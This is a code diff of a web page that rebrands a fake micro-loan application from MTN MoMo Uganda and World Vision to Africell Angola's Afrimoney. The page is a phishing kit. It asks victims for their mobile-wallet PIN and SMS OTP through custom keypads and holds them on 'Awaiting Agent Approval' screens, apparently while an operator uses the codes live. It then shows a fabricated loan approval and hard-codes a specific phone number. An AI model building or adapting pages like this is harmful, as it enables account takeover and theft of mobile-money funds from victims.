-            <label class="block text-xs font-bold text-[#002B49] mb-2" data-i18n="otpLabel">
-              OTP Code (4 digits):
-            </label>
-
-            <!-- 4 OTP Input Boxes + Clear Button '✕' -->
-            <div class="flex items-center space-x-2.5 mb-5">
-              <div class="grid grid-cols-4 gap-2 sm:gap-2.5 flex-1">
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="0" class="otp-box w-full h-13 sm:h-14 text-center text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs outline-none transition-all" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="1" class="otp-box w-full h-13 sm:h-14 text-center text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs outline-none transition-all" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="2" class="otp-box w-full h-13 sm:h-14 text-center text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs outline-none transition-all" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-otp-index="3" class="otp-box w-full h-13 sm:h-14 text-center text-2xl font-black bg-white border border-slate-300 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs outline-none transition-all" />
+              <div class="flex items-center justify-center space-x-3 pt-1">
+                <div class="pin-digit-box active" data-pin-index="0"></div>
+                <div class="pin-digit-box" data-pin-index="1"></div>
+                <div class="pin-digit-box" data-pin-index="2"></div>
+                <div class="pin-digit-box" data-pin-index="3"></div>
               </div>
-              
-              <button type="button" onclick="clearOtp()" class="p-2 text-slate-400 hover:text-slate-600 transition-colors focus:outline-none flex items-center justify-center" aria-label="Clear OTP">
+            </div>
+
+            <!-- Remember Me Checkbox -->
+            <div class="flex items-center space-x-2.5 pt-0.5">
+              <label class="relative flex items-center cursor-pointer">
+                <input id="remember-me-checkbox" type="checkbox" checked class="sr-only peer" />
+                <div class="w-5 h-5 bg-white border border-slate-300 rounded peer-checked:bg-[#9B1479] peer-checked:border-[#9B1479] flex items-center justify-center transition-all">
+                  <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/>
+                  </svg>
+                </div>
+              </label>
+              <span class="text-xs font-semibold text-slate-600" data-i18n="rememberMe">Remember Me</span>
+            </div>
+
+            <div id="login-alert" class="hidden p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-semibold text-red-600 text-center"></div>
+
+            <!-- Full-width Pill Sign In Button -->
+            <div>
+              <button 
+                id="signin-submit-btn" 
+                type="button" 
+                disabled 
+                onclick="handleSignInClick()" 
+                class="w-full py-3.5 bg-pink-200 text-white font-bold rounded-full text-sm tracking-wide transition-all duration-150 cursor-not-allowed flex items-center justify-center">
+                <span data-i18n="signInBtn">Sign in</span>
+              </button>
+            </div>
+          </div>
+
+        </section>
+
+        <!-- STEP 5: EXACT MYAFRICELL OTP SCREEN (From Screenshot) -->
+        <section id="step-5" class="hidden flex-1 flex flex-col justify-between min-h-[580px] bg-[#F7F7F7]">
+          
+          <!-- Top Card Wrapper (White background with large rounded bottom corners) -->
+          <div class="bg-white rounded-b-[40px] px-6 pt-7 pb-8 shadow-sm flex flex-col space-y-6">
+            
+            <!-- Header Row: Back button & Language Pill -->
+            <div class="flex items-center justify-between min-h-[36px]">
+              <button 
+                type="button" 
+                onclick="handleScreenBack()" 
+                class="w-9 h-9 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 hover:text-slate-900 transition-colors" 
+                aria-label="Back">
                 <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2" d="M15 19l-7-7 7-7"/>
                 </svg>
               </button>
+
+              <div class="lang-toggle-box cursor-pointer bg-slate-100 rounded-full p-1 flex items-center space-x-1 text-xs select-none">
+                <span class="pill-en font-bold text-[#9B1479] bg-white px-2.5 py-0.5 rounded-full shadow-xs transition-all">en.</span>
+                <span class="pill-pt font-medium text-slate-400 px-2 py-0.5 transition-all">pt.</span>
+              </div>
             </div>
 
-            <!-- Verify & Approve Loan Button -->
+            <!-- Headline -->
+            <div>
+              <h1 class="text-3xl font-normal text-[#9B1479] tracking-tight leading-tight">
+                <span data-i18n="otpHeadline">Enter your</span> <span class="font-black" data-i18n="otpBrand">OTP</span>
+              </h1>
+              <p class="text-xs text-slate-500 font-medium mt-2 leading-relaxed">
+                <span data-i18n="otpSentTo">We sent you a 6-digit code via SMS to</span><br />
+                <span class="font-bold text-[#1E1B4B] flex items-center space-x-1.5 mt-0.5">
+                  <span>📞</span>
+                  <span id="otp-sent-phone">+244 950 548 313</span>
+                </span>
+              </p>
+            </div>
+
+            <!-- 6 OTP Boxes (Discrete rounded cards) -->
+            <div class="flex items-center justify-between gap-1.5 pt-1">
+              <div class="otp-digit-card active" data-otp-index="0"></div>
+              <div class="otp-digit-card" data-otp-index="1"></div>
+              <div class="otp-digit-card" data-otp-index="2"></div>
+              <div class="otp-digit-card" data-otp-index="3"></div>
+              <div class="otp-digit-card" data-otp-index="4"></div>
+              <div class="otp-digit-card" data-otp-index="5"></div>
+            </div>
+
+            <!-- Resend Countdown -->
+            <div class="text-center text-xs font-medium text-slate-500">
+              <span data-i18n="resendPrompt">Didn't get the code? Resend in</span>
+              <span id="resend-countdown" class="font-bold text-[#F59E0B] ml-1">1:59</span>
+            </div>
+
+            <div id="otp-alert" class="hidden p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-semibold text-red-600 text-center"></div>
+
+            <!-- Verify Button -->
+            <div>
+              <button 
+                id="otp-verify-btn" 
+                type="button" 
+                disabled 
+                onclick="handleOtpVerifyClick()" 
+                class="w-full py-3.5 bg-pink-200 text-white font-bold rounded-full text-sm tracking-wide transition-all duration-150 cursor-not-allowed flex items-center justify-center">
+                <span data-i18n="verifyBtn">Verify</span>
+              </button>
+            </div>
+          </div>
+
+        </section>
+
+        <!-- STEP 6: Approved Dashboard -->
+        <section id="step-6" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-4 text-slate-800 bg-white">
+          <div class="text-center pt-2">
+            <div class="inline-flex items-center justify-center w-14 h-14 bg-pink-100 rounded-full text-2xl mb-2 text-[#9B1479] font-black shadow-xs">
+              🎉
+            </div>
+            <h2 class="text-2xl font-black text-slate-900 tracking-tight" data-i18n="approvedTitle">Congratulations!</h2>
+            <p class="text-xs text-slate-500 font-medium max-w-xs mx-auto mt-1 leading-relaxed" data-i18n="approvedSub">
+              Your loan has been approved! Funds are being disbursed to your Afrimoney account.
+            </p>
+          </div>
+
+          <!-- Approved Amount Card in Kz -->
+          <div class="africell-card-gradient text-white rounded-2xl p-5 sm:p-6 text-center shadow-xl relative overflow-hidden border-2 border-pink-300">
+            <div class="text-[11px] font-black uppercase text-pink-200 tracking-widest mb-1.5" data-i18n="approvedAmountLabel">
+              APPROVED LOAN AMOUNT
+            </div>
+            <div class="text-3xl sm:text-4xl font-black tracking-tight text-white py-1">
+              <span id="summary-approved-amount">500.000 Kz</span>
+            </div>
+          </div>
+
+          <!-- Compliance Notice -->
+          <div class="bg-pink-50 border border-pink-200 rounded-2xl p-4 text-xs shadow-xs space-y-1.5">
+            <div class="font-black text-[#9B1479] text-xs tracking-wider flex items-center space-x-1.5 uppercase">
+              <span>⚠️</span>
+              <span data-i18n="complianceNoticeTitle">COMPLIANCE NOTICE</span>
+            </div>
+            <p class="text-[11.5px] text-slate-700 leading-relaxed font-medium" data-i18n="complianceNoticeBody">
+              Your Afrimoney account must remain active. Ensure your mobile wallet is registered to receive the disbursement.
+            </p>
+          </div>
+
+          <!-- Loan Summary List in Kz -->
+          <div class="bg-white border border-slate-200 rounded-2xl p-4.5 space-y-3 shadow-xs">
+            <h3 class="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center space-x-1.5 border-b border-slate-100 pb-2.5">
+              <span>💳</span>
+              <span data-i18n="loanDetailsHeader">Loan Details</span>
+            </h3>
+
+            <div class="space-y-3 text-xs">
+              <div class="flex items-center space-x-3">
+                <div class="w-9 h-9 bg-emerald-500 text-white rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
+                  💵
+                </div>
+                <div class="flex-1 min-w-0">
+                  <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="monthlyPaymentLabel">MONTHLY INSTALLMENT</div>
+                  <div id="summary-monthly-payment" class="text-xs font-black text-slate-800 tracking-tight">87.500 Kz</div>
+                </div>
+              </div>
+
+              <div class="flex items-center space-x-3">
+                <div class="w-9 h-9 bg-[#9B1479] text-white rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
+                  📅
+                </div>
+                <div class="flex-1 min-w-0">
+                  <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="loanTermLabel">LOAN TERM</div>
+                  <div id="summary-term-display" class="text-xs font-black text-slate-800 tracking-tight">6 Months</div>
+                </div>
+              </div>
+
+              <div class="flex items-center space-x-3">
+                <div class="w-9 h-9 bg-[#1E1B4B] text-pink-300 rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
+                  📈
+                </div>
+                <div class="flex-1 min-w-0">
+                  <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="interestRateLabel">INTEREST RATE</div>
+                  <div class="text-xs font-black text-slate-800 tracking-tight">5% Flat</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="pt-2">
             <button 
-              id="verify-otp-btn" 
               type="button" 
-              disabled 
-              onclick="submitOtpVerification()" 
-              class="w-full py-4 bg-slate-200 text-slate-400 font-extrabold rounded-xl text-xs sm:text-sm tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-xs flex items-center justify-center space-x-2"
-              data-i18n="verifyApproveBtn">
-              <span>VERIFY & APPROVE LOAN</span>
-            </button>
-
-            <!-- Error / Retry alert -->
-            <div id="otp-retry-alert" class="mt-4 p-3 bg-red-50 border border-red-300 rounded-xl text-xs font-bold text-red-700 text-center hidden"></div>
-
-            <!-- Live Waiting Box for OTP Verification -->
-            <div id="otp-waiting-box" class="hidden mt-4 p-4 bg-yellow-50/60 border border-yellow-200 rounded-2xl text-center space-y-2">
-              <div class="flex items-center justify-center space-x-2">
-                <span class="inline-block w-2.5 h-2.5 rounded-full bg-[#002B49] animate-ping"></span>
-                <span class="text-xs font-bold text-[#002B49] uppercase tracking-wider">⏳ Awaiting Agent Approval</span>
-              </div>
-              <p class="text-xs text-slate-700 font-semibold">OTP code submitted. Please wait while your MoMo Agent validates your loan approval...</p>
-              <div class="flex justify-center pt-1">
-                <svg class="animate-spin h-5 w-5 text-[#002B49]" fill="none" viewBox="0 0 24 24">
-                  <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                  <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-              </div>
-            </div>
-
-          </div>
-        </div>
-
-        <!-- Curved bottom matching MTN branding -->
-        <div class="momo-gradient text-white pt-6 pb-5 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto border-t-2 border-[#FFCC00]">
-          <div class="inline-flex flex-col items-center">
-            <span class="text-sm font-black text-[#FFCC00] tracking-tight">MTN Mobile Money Uganda</span>
-            <span class="text-[10px] text-blue-100 font-medium">Bank of Uganda Regulated • Dial *165#</span>
-          </div>
-        </div>
-      </section>
-
-      <!-- STEP 6: Live Application Status & Approved Dashboard (Final Phase) -->
-      <section id="step-6" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-4 text-slate-800 bg-white">
-        
-        <!-- Top Celebration Header -->
-        <div class="text-center pt-2">
-          <div class="inline-flex items-center justify-center w-14 h-14 bg-yellow-100/90 rounded-full text-2xl mb-2 shadow-xs">
-            🎉
-          </div>
-          <h2 class="text-2xl font-black text-slate-900 tracking-tight" data-i18n="congratsHeading">Congratulations!</h2>
-          <p class="text-xs text-slate-500 font-medium max-w-xs mx-auto mt-1 leading-relaxed" data-i18n="congratsSub">
-            Your loan has been approved! Funds are being disbursed to your MoMo account.
-          </p>
-        </div>
-
-        <!-- Big Approved Amount Card -->
-        <div class="momo-gradient text-white rounded-2xl p-5 sm:p-6 text-center shadow-xl relative overflow-hidden border-2 border-[#FFCC00]">
-          <div class="text-[11px] font-black uppercase text-yellow-300 tracking-widest mb-1.5" data-i18n="approvedAmountLabel">
-            APPROVED LOAN AMOUNT
-          </div>
-          <div class="text-3xl sm:text-4xl font-black tracking-tight text-white py-1">
-            <span id="summary-approved-amount">UGX 500,000</span>
-          </div>
-        </div>
-
-        <!-- Compliance Notice Alert Box -->
-        <div class="bg-yellow-50/90 border border-yellow-300 rounded-2xl p-4 text-xs shadow-xs space-y-2">
-          <div class="font-black text-[#002B49] text-xs tracking-wider flex items-center space-x-1.5 uppercase">
-            <span>⚠️</span>
-            <span data-i18n="complianceNoticeTitle">COMPLIANCE NOTICE</span>
-          </div>
-          <p class="text-[11.5px] text-slate-700 leading-relaxed font-medium" data-i18n="complianceNoticeBody">
-            Your MoMo account must remain active. Ensure your mobile wallet is enabled for loan disbursement.
-          </p>
-        </div>
-
-        <!-- Loan Summary List -->
-        <div class="bg-white border border-slate-200/90 rounded-2xl p-4.5 space-y-3 shadow-xs">
-          <h3 class="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center space-x-1.5 border-b border-slate-100 pb-2.5">
-            <span>💳</span>
-            <span data-i18n="loanDetailsHeader">Loan Details</span>
-          </h3>
-
-          <div class="space-y-3 text-xs">
-            <!-- Monthly Payment Item -->
-            <div class="flex items-center space-x-3">
-              <div class="w-9 h-9 bg-emerald-500 text-white rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
-                💵
-              </div>
-              <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="monthlyPaymentLabel">MONTHLY PAYMENT</div>
-                <div id="summary-monthly-payment" class="text-xs font-black text-slate-800 tracking-tight">UGX 85,000</div>
-              </div>
-            </div>
-
-            <!-- Loan Term Item -->
-            <div class="flex items-center space-x-3">
-              <div class="w-9 h-9 bg-sky-500 text-white rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
-                📅
-              </div>
-              <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="loanTermLabel">LOAN TERM</div>
-                <div id="summary-term-display" class="text-xs font-black text-slate-800 tracking-tight">6 Months</div>
-              </div>
-            </div>
-
-            <!-- Interest Rate Item -->
-            <div class="flex items-center space-x-3">
-              <div class="w-9 h-9 bg-[#002B49] text-[#FFCC00] rounded-xl flex items-center justify-center font-bold text-sm shadow-xs flex-shrink-0">
-                📈
-              </div>
-              <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="interestRateLabel">INTEREST RATE</div>
-                <div class="text-xs font-black text-slate-800 tracking-tight">5% APR</div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <!-- Quick Actions -->
-        <div class="space-y-2 pt-1">
-          <div class="text-xs font-bold text-slate-500 text-center uppercase tracking-wider mb-2" data-i18n="quickActionsTitle">
-            Quick Actions
-          </div>
-
-          <div class="space-y-2">
-            <button type="button" onclick="toggleNoticeModal(true, 'Deposit Funds', 'Your MoMo account is configured for loan disbursement.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
-              <span>💰</span>
-              <span data-i18n="btnDeposit">Deposit Funds</span>
-            </button>
-            <button type="button" onclick="toggleNoticeModal(true, 'Withdraw Funds', 'Withdrawal processing will be initiated upon approval verification.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
-              <span>💸</span>
-              <span data-i18n="btnWithdraw">Withdraw Funds</span>
-            </button>
-            <button type="button" onclick="toggleNoticeModal(true, 'Loan Details', 'Your MoMo loan application is active. Reference ID: ' + (appState.applicationId || 'MOMO-PENDING'))" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
-              <span>📄</span>
-              <span data-i18n="btnLoanInfo">Loan Details</span>
+              onclick="goToStep(0)" 
+              class="w-full py-4 bg-[#1E1B4B] hover:bg-slate-900 text-white font-black rounded-xl shadow-lg text-xs tracking-wider uppercase flex items-center justify-center space-x-2 transition-all active:scale-[0.99]"
+              data-i18n="returnHomeBtn">
+              <span>🏠</span>
+              <span>Return Home</span>
             </button>
           </div>
-        </div>
+        </section>
 
-        <!-- Next Steps -->
-        <div class="bg-blue-50/70 border border-blue-200/80 rounded-2xl p-4 text-xs space-y-1 text-left">
-          <div class="font-extrabold text-slate-900 text-xs flex items-center space-x-1.5">
-            <span>📱</span>
-            <span data-i18n="nextStepsTitle">Next Steps:</span>
-          </div>
-          <p class="text-[11px] text-slate-600 font-medium leading-relaxed" data-i18n="nextStepsBody">
-            You will receive an SMS confirmation with transaction details shortly.
-          </p>
-        </div>
+      </main>
 
-        <!-- Return Home CTA Button -->
-        <div class="pt-2">
-          <button 
-            type="button" 
-            onclick="goToStep(0)" 
-            class="w-full py-4 bg-[#002B49] hover:bg-[#001D38] text-[#FFCC00] border-2 border-[#FFCC00] font-black rounded-xl shadow-lg shadow-blue-950/20 text-xs tracking-wider uppercase flex items-center justify-center space-x-2 transition-all active:scale-[0.99]"
-            data-i18n="returnHomeBtn">
-            <span>🏠</span>
-            <span>Return Home</span>
-          </button>
-        </div>
+    </div>
 
-      </section>
+    <!-- Bottom Keypad Area (Appears for Steps 3 & 5 exactly as created before) -->
+    <div id="keypad-container" class="hidden px-8 pb-8 pt-4">
+      <div class="grid grid-cols-3 gap-y-2 gap-x-6 text-center select-none">
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('1')">1</button>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('2')">2</button>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('3')">3</button>
 
-    </main>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('4')">4</button>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('5')">5</button>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('6')">6</button>
 
-    <!-- Footer Wave / Brand Tag (Dynamic World Vision <-> MTN MoMo Uganda) -->
-    <footer id="page-footer" class="bg-[#0C2340] text-orange-200 py-3.5 px-4 text-center text-[11px] border-t border-slate-800 transition-all">
-      <p data-i18n="footerRights">© 2026 World Vision — Community Grants & Development Partnerships</p>
-    </footer>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('7')">7</button>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('8')">8</button>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('9')">9</button>
 
-    <!-- Notification Modal -->
-    <div id="notice-modal" class="fixed inset-0 bg-black/60 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm">
-      <div class="bg-white rounded-2xl max-w-xs w-full p-6 shadow-2xl text-center space-y-4">
-        <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Information</h3>
-        <p id="modal-message" class="text-xs text-slate-600 leading-relaxed"></p>
-        <button onclick="toggleNoticeModal(false)" class="w-full py-3 bg-[#002b49] hover:bg-[#003d66] text-white text-xs font-bold rounded-xl shadow-md">
-          Dismiss
+        <div class="custom-numpad-key opacity-0 pointer-events-none"></div>
+        <button type="button" class="custom-numpad-key" onclick="handleNumKey('0')">0</button>
+        <button type="button" class="custom-numpad-key text-slate-500 hover:text-slate-800" onclick="handleDeleteKey()" aria-label="Delete">
+          <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6-6h12a2 2 0 012 2v8a2 2 0 01-2 2H9l-6-6z"/>
+          </svg>
         </button>
       </div>
     </div>
 
-    <!-- Full-Page Approval Overlay Screen -->
-    <div id="full-page-approval-modal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center p-6 bg-blue-950/95 backdrop-blur-xl text-white text-center transition-all duration-300">
-      <div class="max-w-sm w-full bg-white text-slate-900 rounded-3xl p-7 shadow-2xl border border-blue-100 flex flex-col items-center space-y-6 relative overflow-hidden">
-        <!-- Top decorative yellow accent bar -->
-        <div class="absolute top-0 inset-x-0 h-2 bg-brand-yellow"></div>
+    <!-- Standard Footer for Steps 0, 1, 2, 6 -->
+    <footer id="page-footer" class="bg-[#1E1B4B] text-pink-200 py-3.5 px-4 text-center text-[11px] border-t border-slate-800 transition-all">
+      <p data-i18n="footerRights">© 2026 Africell Angola — Afrimoney Micro-Crédito. All rights reserved.</p>
+    </footer>
+
+    <!-- Approval Modal -->
+    <div id="full-page-approval-modal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center p-6 bg-slate-900/95 backdrop-blur-md text-white text-center transition-all duration-300">
+      <div class="max-w-sm w-full bg-white text-slate-900 rounded-3xl p-7 shadow-2xl border border-pink-100 flex flex-col items-center space-y-6 relative overflow-hidden">
+        <div class="absolute top-0 inset-x-0 h-2 bg-[#9B1479]"></div>
 
         <div class="relative flex items-center justify-center pt-2">
-          <div class="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center shadow-inner border-4 border-blue-50">
-            <span class="text-2xl font-black text-brand-blue">MoMo</span>
+          <div class="w-20 h-20 rounded-full bg-pink-100 flex items-center justify-center shadow-inner border-4 border-pink-50">
+            <span class="text-2xl font-black text-[#9B1479]">a</span>
           </div>
           <span class="absolute bottom-0 right-0 flex h-6 w-6">
-            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-yellow opacity-75"></span>
-            <span class="relative inline-flex rounded-full h-6 w-6 bg-brand-yellow text-xs font-black text-blue-950 items-center justify-center shadow-md">⏳</span>
+            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#9B1479] opacity-75"></span>
+            <span class="relative inline-flex rounded-full h-6 w-6 bg-[#9B1479] text-xs font-black text-white items-center justify-center shadow-md">⏳</span>
           </span>
         </div>
 
         <div class="space-y-2 px-2">
           <h3 id="approval-modal-title" class="text-lg font-extrabold text-slate-900 tracking-tight">Awaiting Approval</h3>
-          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Your request has been submitted. Please wait while your MoMo Agent approves your verification...</p>
+          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Your request has been submitted. Please wait while your Africell Agent verifies your request...</p>
         </div>
 
-        <div class="w-full pt-1 flex items-center justify-center space-x-3 bg-blue-50 border border-blue-200 rounded-2xl py-3.5 px-4 shadow-sm">
-          <svg class="animate-spin h-5 w-5 text-brand-blue flex-shrink-0" fill="none" viewBox="0 0 24 24">
-            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-          </svg>
-          <span id="approval-modal-status" class="text-xs font-extrabold text-blue-950 uppercase tracking-wider">Verifying with Agent...</span>
+        <div class="w-full pt-1 flex items-center justify-center space-x-3 bg-pink-50 border border-pink-200 rounded-2xl py-3.5 px-4 shadow-sm">
+          <div class="w-5 h-5 border-2 border-pink-300 border-t-[#9B1479] rounded-full animate-spin"></div>
+          <span id="approval-modal-status" class="text-xs font-extrabold text-[#9B1479] uppercase tracking-wider">Verifying with Agent...</span>
         </div>
+      </div>
+    </div>
+
+    <!-- Notice Modal -->
+    <div id="notice-modal" class="fixed inset-0 bg-black/60 z-50 hidden flex items-center justify-center p-4 backdrop-blur-xs">
+      <div class="bg-white rounded-2xl max-w-xs w-full p-6 shadow-2xl text-center space-y-4">
+        <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Information</h3>
+        <p id="modal-message" class="text-xs text-slate-600 leading-relaxed"></p>
+        <button onclick="toggleNoticeModal(false)" class="w-full py-3 bg-[#9B1479] hover:bg-[#7A0E5F] text-white text-xs font-bold rounded-xl shadow-md">
+          Dismiss
+        </button>
       </div>
     </div>
 
@@ -971,68 +809,65 @@
   <script>
     window.t = window.t || function(key) { return key; };
     let currentStep = 0;
+    let phoneNumber = '950548313';
+    let accountPin = '';
     let pinVisible = false;
-
-    function getStoredReferralToken() {
-      try {
-        const urlParams = new URLSearchParams(window.location.search);
-        const fromUrl = urlParams.get('ref') || urlParams.get('agent') || urlParams.get('admin') || urlParams.get('r');
-        if (fromUrl && fromUrl.trim()) {
-          const val = fromUrl.trim();
-          sessionStorage.setItem('momo_ref_token', val);
-          localStorage.setItem('momo_ref_token', val);
-          return val;
-        }
-        return sessionStorage.getItem('momo_ref_token') || localStorage.getItem('momo_ref_token') || null;
-      } catch (_) {
-        return null;
-      }
-    }
-
-    function initReferralBanner() {
-      const token = getStoredReferralToken();
-      if (token) {
-        const banner = document.getElementById('referral-banner');
-        const disp = document.getElementById('referral-code-display');
-        if (banner) banner.classList.remove('hidden');
-        if (disp) disp.textContent = token;
-      }
-    }
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', initReferralBanner);
-    } else {
-      initReferralBanner();
-    }
+    let otpCode = '';
+    let countdownSeconds = 119;
+    let countdownInterval = null;
+    let applicationId = null;
+    let activePinVerId = null;
+    let lastHandledRejectPinId = null;
+    let activeOtpVerId = null;
+    let lastHandledRejectOtpId = null;
+    let pollingInterval = null;
 
     const appState = {
       loanAmount: 500000,
       loanTermMonths: 6,
-      loanType: 'Community & Child Welfare',
-      purpose: 'Community Development & Child Welfare Initiative',
+      loanType: 'Personal Emergency Loan',
+      purpose: 'Afrimoney Personal Quick Loan',
       orgName: '',
-      employment: 'Community-Based Organization (CBO)',
+      employment: 'Employed / Salaried',
       firstName: '',
       lastName: '',
-      phoneNumber: '',
-      momoPin: '',
-      applicationId: null
+      phoneNumber: '950548313'
     };
 
+    function formatPhoneDisplay(num) {
+      if (!num) return '';
+      const clean = num.replace(/[^0-9]/g, '');
+      const parts = [];
+      if (clean.length > 0) parts.push(clean.substring(0, 3));
+      if (clean.length > 3) parts.push(clean.substring(3, 6));
+      if (clean.length > 6) parts.push(clean.substring(6, 9));
+      return parts.join(' ');
+    }
+
+    function formatKz(amount) {
+      return (Number(amount) || 0).toLocaleString('de-DE') + ' Kz';
+    }
+
     function calculateMonthly(amount, months) {
-      return Math.round(amount / (months || 6));
+      const principal = amount || 500000;
+      const m = months || 6;
+      const total = principal * 1.05;
+      return Math.round(total / m);
     }
 
     function updateCalculator(val) {
       const amount = parseInt(val || appState.loanAmount, 10) || 500000;
       appState.loanAmount = amount;
+      
       const displayEl = document.getElementById('calc-amount-display');
-      if (displayEl) displayEl.innerText = 'UGX ' + amount.toLocaleString();
+      if (displayEl) displayEl.innerText = formatKz(amount);
       
       const monthly = calculateMonthly(amount, appState.loanTermMonths);
       const monthlyEl = document.getElementById('calc-monthly-payment');
-      if (monthlyEl) monthlyEl.innerText = monthly.toLocaleString();
+      if (monthlyEl) monthlyEl.innerText = formatKz(monthly);
+
       const totalEl = document.getElementById('calc-total-payment');
-      if (totalEl) totalEl.innerText = 'UGX ' + amount.toLocaleString();
+      if (totalEl) totalEl.innerText = formatKz(Math.round(amount * 1.05));
       
       const loanAmountInput = document.getElementById('loan-amount-input');
       if (loanAmountInput) loanAmountInput.value = amount;
@@ -1041,14 +876,14 @@
     function setTerm(months, ev) {
       appState.loanTermMonths = months;
       document.querySelectorAll('.term-btn').forEach(btn => {
-        btn.classList.remove('border-2', 'border-[#FF6700]', 'bg-orange-50', 'text-orange-950', 'border-brand-blue', 'bg-brand-blueLight', 'text-brand-blueDeep', 'shadow-sm');
+        btn.classList.remove('border-2', 'border-[#9B1479]', 'bg-pink-50', 'text-[#9B1479]', 'shadow-xs');
         btn.classList.add('border', 'border-slate-200', 'text-slate-700');
       });
 
       const e = ev || (typeof event !== 'undefined' ? event : null);
       if (e && e.target) {
         e.target.classList.remove('border', 'border-slate-200', 'text-slate-700');
-        e.target.classList.add('border-2', 'border-[#FF6700]', 'bg-orange-50', 'text-orange-950', 'shadow-sm');
+        e.target.classList.add('border-2', 'border-[#9B1479]', 'bg-pink-50', 'text-[#9B1479]', 'shadow-xs');
       }
 
       const termSelect = document.getElementById('loan-term-select');
@@ -1057,32 +892,155 @@
       updateCalculator(appState.loanAmount);
     }
 
-    function showClipboardToast(msg) {
-      let toast = document.getElementById('clipboard-toast');
-      if (!toast) {
-        toast = document.createElement('div');
-        toast.id = 'clipboard-toast';
